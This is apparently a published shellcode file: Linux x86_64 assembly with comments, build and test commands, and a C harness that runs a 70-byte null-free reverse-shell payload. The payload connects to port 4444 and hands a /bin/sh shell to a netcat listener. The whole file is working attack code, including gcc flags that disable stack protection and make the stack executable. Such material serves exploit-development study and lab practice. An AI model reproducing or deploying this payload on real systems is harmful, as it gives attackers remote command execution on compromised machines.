/*

Title: Linux/x86_64 - Reverse(0.0.0.0:4444/TCP)Shell(/bin/sh)- Null Free Shellcode
;Author: Aron Mihaljevic
;Architecture: Linux x86_64
;Shellcode Length:  70 bytes
;github = https://github.com/STARRBOY

compilation and execution of assembly code
-------------------------------------
nasm -felf64 reverse.nasm -o reverse.o
ld reverse.o -o reverse
---------------------------
dumping binaries
----------------------------------------------------------------------------------
for i in $(objdump -d reverse |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
----------------------------------------------------------------------------------
C program
-------------------------------------------------------------------
gcc -fno-stack-protector -z execstack reverse_tcp.c -o reverse_tcp
----------------------------------------------------------------
test:
open a terminal and run this " nc -l 0.0.0.0 4444 "

after you have done that,
open another one and run a shellcode



global _start

section .text

_start:


    ; create socket
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

	push 41       	;sys_socket
	pop rax
        push 2		; AF_INET
        pop rdi
       	push 1		;SOCK_STREAM
        pop rsi
        xor rdx,	rdx		;rdx = 0
        syscall


	xchg rdi,	rax	;save a socket descriptor

connect:

	; struct sockaddr_in addr;
    	; addr.sin_family = AF_INET;
    	; addr.sin_port = htons(4444);
   	; addr.sin_addr.s_addr = inet_addr("0.0.0.0");
   	; connect(connect_socket_fd, (struct sockaddr *)&addr, sizeof(addr));

	push    2               ;sin_family = AF_INET
        mov word [rsp + 2], 0x5c11      ;port = 4444
        push    rsp

	push	42		;sys_connect
	pop 	rax
				;rdi already contains a socket descriptor
	pop 	rsi		;(addr.sin_port,2 bytes) push htons(4444)
	push	16		;sizeof(addr)
	pop	rdx
	syscall

    	push 	3		;push counter
        pop 	rsi
dup2loop:

        ; int dup2(int oldfd, int newfd);

	push	33		;dup2 syscall
	pop	rax
        dec 	rsi		;next number
        syscall
        loopnz dup2loop  	;loop

spawn_shell:

	; int execve(const char *filename, char *const argv[],char *const envp[]);


	xor     rsi,	rsi			 ;clear rsi
	push	rsi			         ;push null on the stack
	mov 	rdi,	0x68732f2f6e69622f	 ;/bin//sh in reverse order
	push	rdi
	push	rsp
	pop	rdi	        		 ;stack pointer to /bin//sh
	mov 	al,	    59      		 ;sys_execve
	cdq					 ;sign extend of eax
	syscall

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[]=\
		 "\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
		 "\x5e\x48\x31\xd2\x0f\x05\x48\x97"
		 "\x6a\x02\x66\xc7\x44\x24\x02\x11"
		 "\x5c\x54\x6a\x2a\x58\x5e\x6a\x10"
		 "\x5a\x0f\x05\x6a\x03\x5e\x6a\x21"
		 "\x58\x48\xff\xce\x0f\x05\xe0\xf6"
		 "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
		 "\x69\x6e\x2f\x2f\x73\x68\x57\x54"
		 "\x5f\xb0\x3b\x99\x0f\x05";


int main(){

        printf("length of your shellcode is: %d\n", (int)strlen(shellcode));

        int (*ret)() = (int(*)())shellcode;

        ret();
}